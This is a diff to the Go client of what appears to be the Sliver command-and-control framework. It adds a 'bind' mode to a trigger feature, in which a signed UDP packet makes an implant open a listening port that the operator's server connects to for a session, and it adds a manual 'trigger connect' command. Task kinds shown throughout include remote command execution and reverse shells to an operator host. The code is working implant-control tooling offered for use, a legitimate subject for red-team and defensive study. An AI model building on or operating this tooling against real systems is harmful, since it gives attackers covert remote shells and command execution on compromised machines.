@@ -54,10 +54,11 @@ import (
 //	                  on stdin (masked on TTY, line-read when piped).
 //	--server-id       audit identifier (defaults to "sliver-trigger")
 //	--task            repeatable; one of:
-//	                    NAME:wake-beacon:<beacon-uuid>
+//	                    NAME:wake-callback:<target-uuid>
 //	                    NAME:stop-job:<job-name>
 //	                    NAME:exec:<absolute-cmd-path>[,<arg1>,<arg2>...]
 //	                    NAME:reverse-shell:<host:port>[,tls]
+//	                    NAME:bind:<host:port>[,udp]
 //	--allowed-source  repeatable; exact IP or CIDR (v4/v6)
 //	--allowed-client  repeatable; client_id values to accept
 //	--strict          require every accepted client_id to have a per-
@@ -333,8 +334,22 @@ func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string
 	// a dynamic callback address (e.g. "mtls://10.0.0.5:8888"). The
 	// callback URL is sent in the payload field and the implant will use
 	// it as a temporary C2 override instead of its baked-in C2 list.
-	// This is protected by the HMAC signature on the trigger packet.
 	callbackAddr, _ := cmd.Flags().GetString("callback")
+
+	// --bind flag: fold bind into the wake subcommand. When specified,
+	// the intent is rewritten from "wake" to "bind" on the wire. The
+	// implant opens a listener and the operator connects to it.
+	useBind, _ := cmd.Flags().GetBool("bind")
+	bindPort, _ := cmd.Flags().GetUint32("bind-port")
+	bindProto, _ := cmd.Flags().GetString("bind-proto")
+
+	// Mutual exclusion: --callback and --bind cannot coexist.
+	if callbackAddr != "" && useBind {
+		con.PrintErrorf("--callback and --bind are mutually exclusive (callback = implant connects out; bind = implant listens)\n")
+		return
+	}
+
+	// Handle --callback (wake with dynamic callback).
 	if callbackAddr != "" {
 		if intent != "wake" {
 			con.PrintErrorf("--callback is only valid with intent=wake\n")
@@ -344,19 +359,69 @@ func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string
 			con.PrintErrorf("--callback must be a full C2 URL (e.g. mtls://10.0.0.5:8888)\n")
 			return
 		}
-		// The callback URL becomes the payload. If the operator also
-		// specified --payload (transport hint), the callback URL takes
-		// precedence since it includes the scheme.
 		if payload != "" {
 			con.PrintWarnf("--callback overrides --payload for wake intent\n")
 		}
 		payload = callbackAddr
 	}
 
+	// Handle --bind (wake with bind session).
+	ttlSecs, _ := cmd.Flags().GetUint32("ttl")
+	noSession, _ := cmd.Flags().GetBool("no-session")
+	noConnect, _ := cmd.Flags().GetBool("no-connect")
+	if useBind {
+		if intent != "wake" {
+			con.PrintErrorf("--bind is only valid with intent=wake\n")
+			return
+		}
+		// Rewrite intent to "bind" on the wire.
+		intent = "bind"
+		if bindProto == "" {
+			bindProto = "tcp"
+		}
+		bindProto = strings.ToLower(bindProto)
+		if bindProto != "tcp" && bindProto != "udp" {
+			con.PrintErrorf("--bind-proto must be 'tcp' or 'udp'\n")
+			return
+		}
+		if noSession && bindProto != "udp" {
+			con.PrintErrorf("--no-session is only valid with --bind-proto udp\n")
+			return
+		}
+		// Build payload: "proto:port[:options]"
+		// If the operator specified --payload directly, that takes precedence.
+		if payload == "" {
+			payload = fmt.Sprintf("%s:%d", bindProto, bindPort)
+			// Append options if non-default.
+			var opts []string
+			if ttlSecs != 30 {
+				opts = append(opts, fmt.Sprintf("ttl=%d", ttlSecs))
+			}
+			if noSession {
+				opts = append(opts, "nosession")
+			}
+			if noConnect {
+				opts = append(opts, "noconnect")
+			}
+			if len(opts) > 0 {
+				payload += ":" + strings.Join(opts, ",")
+			}
+		}
+	} else if bindPort != 0 || cmd.Flags().Changed("bind-proto") {
+		con.PrintErrorf("--bind-port and --bind-proto require --bind\n")
+		return
+	}
+
 	con.PrintInfof("Sending trigger packet: target=%s:%d intent=%s client-id=%s\n",
 		targetHost, port, intent, clientID)
 	if callbackAddr != "" {
 		con.PrintInfof("Dynamic callback: %s\n", callbackAddr)
+	} else if intent == "bind" {
+		if bindPort > 0 {
+			con.PrintInfof("Bind: %s port %d on implant (TTL %ds)\n", bindProto, bindPort, ttlSecs)
+		} else {
+			con.PrintInfof("Bind: %s on random ephemeral port, TTL %ds (implant will report actual port)\n", bindProto, ttlSecs)
+		}
 	} else if payload != "" {
 		con.PrintInfof("Payload: %s\n", payload)
 	}
@@ -375,7 +440,7 @@ func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string
 	}
 
 	if intent == "exec" && resp != nil {
-		// Bidirectional: display the implant's response.
+		// Bidirectional: display the implant's exec response.
 		con.PrintInfof("Trigger packet sent to %s:%d (intent=%s)\n", targetHost, port, intent)
 		if resp.Error != "" {
 			con.PrintErrorf("Implant error: %s\n", resp.Error)
@@ -385,7 +450,6 @@ func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string
 			con.PrintInfof("Output:\n")
 			con.Println(resp.Output)
 
-			// Item 5: --output flag writes exec output to file
 			outputPath, _ := cmd.Flags().GetString("output")
 			if outputPath != "" {
 				if writeErr := os.WriteFile(outputPath, []byte(resp.Output), 0600); writeErr != nil {
@@ -397,10 +461,109 @@ func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string
 		} else if resp.Error == "" {
 			con.PrintInfof("No output received (command may have produced no output)\n")
 		}
+	} else if intent == "bind" && resp != nil {
+		// Bidirectional: the implant reports the actual bind address.
+		// The server auto-connects to establish a full Sliver session.
+		con.PrintInfof("Trigger packet sent to %s:%d\n", targetHost, port)
+		if resp.Error != "" {
+			con.PrintErrorf("Bind failed on implant: %s\n", resp.Error)
+		} else if resp.Output != "" {
+			con.PrintInfof("Implant bind listening on: %s\n", resp.Output)
+			if noConnect {
+				con.PrintInfof("No-connect mode: server will NOT auto-connect.\n")
+				con.PrintInfof("Connect manually:  trigger connect <index> %s\n", resp.Output)
+			} else if noSession {
+				con.PrintInfof("Raw encrypted shell (--no-session): use 'trigger connect' to attach.\n")
+			} else {
+				con.PrintInfof("Server auto-connecting to establish session...\n")
+				con.PrintInfof("Watch 'sessions' for the new session to appear.\n")
+			}
+		} else {
+			con.PrintInfof("No response received (implant may be unreachable)\n")
+		}
 	} else {
 		con.PrintInfof("Trigger packet sent to %s:%d (intent=%s)\n", targetHost, port, intent)
 		con.PrintInfof("Note: UDP is fire-and-forget -- delivery is not confirmed.\n")
 	}
+}
+
+// TriggerConnectCmd - Manually connect to an implant's bind port.
+// Performs the HMAC auth handshake and establishes an encrypted session.
+// Used after "trigger send ... --no-connect" or to re-attach to a
+// still-open bind port.
+//
+// Usage:
+//
+//	trigger connect <target-ip|trigger-index> <bind-address>
+func TriggerConnectCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
+	if len(args) < 2 {
+		con.PrintErrorf("usage: trigger connect <target-ip|trigger-index> <bind-address>\n")
+		return
+	}
+
+	firstArg := strings.TrimSpace(args[0])
+	bindAddr := strings.TrimSpace(args[1])
+	if firstArg == "" || bindAddr == "" {
+		con.PrintErrorf("target and bind-address are required\n")
+		return
+	}
+
+	var (
+		targetHost string
+		secret     []byte
+		err        error
+	)
+
+	// Resolve target: index or IP.
+	triggerIndex, parseErr := strconv.Atoi(firstArg)
+	isIndex := parseErr == nil && triggerIndex > 0 && triggerIndex < 10000
+
+	if isIndex {
+		var port uint32
+		var clientID string
+		targetHost, port, secret, clientID, err = resolveTriggerIndex(triggerIndex, cmd, con)
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+		_ = port
+		_ = clientID
+	} else {
+		targetHost = firstArg
+		secretEnv, _ := cmd.Flags().GetString("secret-env")
+		directSecret, _ := cmd.Flags().GetString("secret")
+		directSecretChanged := cmd.Flags().Changed("secret")
+		secret, err = secretinput.Resolve(
+			secretEnv, directSecret, directSecretChanged,
+			"--secret", "triggerwake HMAC shared secret",
+			func(format string, args ...any) { con.PrintWarnf(format, args...) },
+		)
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+	}
+
+	// The bind address is passed as intent="connect" payload=bindAddr
+	// to the TriggerFire RPC, which recognizes "connect" as a direct
+	// server→implant connection (no UDP trigger packet sent).
+	con.PrintInfof("Connecting to bind port: %s on %s\n", bindAddr, targetHost)
+	resp, err := con.Rpc.TriggerFire(context.Background(), &clientpb.TriggerFireReq{
+		TargetHost:   targetHost,
+		TargetPort:   0, // not used for connect
+		Intent:       "connect",
+		SharedSecret: secret,
+		Payload:      bindAddr,
+	})
+	if err != nil {
+		con.PrintErrorf("Connect failed: %s\n", err)
+		return
+	}
+	if resp.Error != "" {
+		con.PrintErrorf("Connect error: %s\n", resp.Error)
+		return
+	}
+	con.PrintInfof("Connection initiated. Watch 'sessions' for the new session.\n")
 }
 
 // resolveTriggerIndex looks up a trigger implant by its 1-based index
@@ -492,9 +655,9 @@ func parseTaskFlags(raw []string) ([]*clientpb.TriggerIntentBinding, error) {
 
 		b := &clientpb.TriggerIntentBinding{Name: name}
 		switch kind {
-		case "wake-beacon":
-			b.Config = &clientpb.TriggerIntentBinding_WakeBeacon{
-				WakeBeacon: &clientpb.WakeBeaconConfig{BeaconID: argstr},
+		case "wake-callback":
+			b.Config = &clientpb.TriggerIntentBinding_WakeCallback{
+				WakeCallback: &clientpb.WakeCallbackConfig{TargetID: argstr},
 			}
 		case "stop-job":
 			b.Config = &clientpb.TriggerIntentBinding_StopJob{
@@ -523,8 +686,29 @@ func parseTaskFlags(raw []string) ([]*clientpb.TriggerIntentBinding, error) {
 					UseTLS:       useTLS,
 				},
 			}
+		case "bind":
+			// Format: host:port[,udp]
+			// Examples:
+			//   NAME:bind:0.0.0.0:5555
+			//   NAME:bind:0.0.0.0:5555,udp
+			//   NAME:bind:0.0.0.0:0,tcp    (random port)
+			bsParts := strings.Split(argstr, ",")
+			bindAddr := strings.TrimSpace(bsParts[0])
+			proto := "tcp"
+			for _, opt := range bsParts[1:] {
+				opt = strings.TrimSpace(strings.ToLower(opt))
+				if opt == "udp" || opt == "tcp" {
+					proto = opt
+				}
+			}
+			b.Config = &clientpb.TriggerIntentBinding_Bind{
+				Bind: &clientpb.BindConfig{
+					BindAddr: bindAddr,
+					Protocol: proto,
+				},
+			}
 		default:
-			return nil, fmt.Errorf("unknown kind %q (want one of: wake-beacon, stop-job, exec, reverse-shell)", kind)
+			return nil, fmt.Errorf("unknown kind %q (want one of: wake-callback, stop-job, exec, reverse-shell, bind)", kind)
 		}
 		out = append(out, b)
 	}
@@ -548,14 +732,16 @@ func taskKindLabel(b *clientpb.TriggerIntentBinding) string {
 
 func taskKindName(b *clientpb.TriggerIntentBinding) string {
 	switch b.GetConfig().(type) {
-	case *clientpb.TriggerIntentBinding_WakeBeacon:
-		return "wake-beacon"
+	case *clientpb.TriggerIntentBinding_WakeCallback:
+		return "wake-callback"
 	case *clientpb.TriggerIntentBinding_StopJob:
 		return "stop-job"
 	case *clientpb.TriggerIntentBinding_Exec:
 		return "exec"
 	case *clientpb.TriggerIntentBinding_ReverseShell:
 		return "reverse-shell"
+	case *clientpb.TriggerIntentBinding_Bind:
+		return "bind"
 	default:
 		return "unknown"
 	}
@@ -563,8 +749,8 @@ func taskKindName(b *clientpb.TriggerIntentBinding) string {
 
 func taskTargetSummary(b *clientpb.TriggerIntentBinding) string {
 	switch cfg := b.GetConfig().(type) {
-	case *clientpb.TriggerIntentBinding_WakeBeacon:
-		return fmt.Sprintf("beacon=%s", cfg.WakeBeacon.GetBeaconID())
+	case *clientpb.TriggerIntentBinding_WakeCallback:
+		return fmt.Sprintf("target=%s", cfg.WakeCallback.GetTargetID())
 	case *clientpb.TriggerIntentBinding_StopJob:
 		return fmt.Sprintf("job=%s", cfg.StopJob.GetJobName())
 	case *clientpb.TriggerIntentBinding_Exec:
@@ -575,6 +761,12 @@ func taskTargetSummary(b *clientpb.TriggerIntentBinding) string {
 			tls = ", tls"
 		}
 		return fmt.Sprintf("%s%s", cfg.ReverseShell.GetOperatorAddr(), tls)
+	case *clientpb.TriggerIntentBinding_Bind:
+		proto := cfg.Bind.GetProtocol()
+		if proto == "" {
+			proto = "tcp"
+		}
+		return fmt.Sprintf("%s://%s", proto, cfg.Bind.GetBindAddr())
 	default:
 		return ""
 	}
